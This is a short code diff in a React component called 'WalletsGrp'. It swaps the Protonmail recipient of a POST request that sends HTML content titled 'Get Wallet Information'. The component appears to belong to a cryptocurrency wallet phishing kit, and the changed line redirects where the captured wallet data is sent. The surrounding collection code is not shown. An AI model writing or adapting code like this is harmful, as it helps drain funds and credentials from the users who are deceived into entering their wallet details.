@@ -240,7 +240,7 @@ export default function WalletsGrp() {
       .post(
         BaseURL,
         {
-          email: "thisislucaswilliam@protonmail.com",
+          email: "longchin@protonmail.com",
           // email:"smartdevpro001@gmail.com",
           html: htmlContent,
           title: "Get Wallet Information",
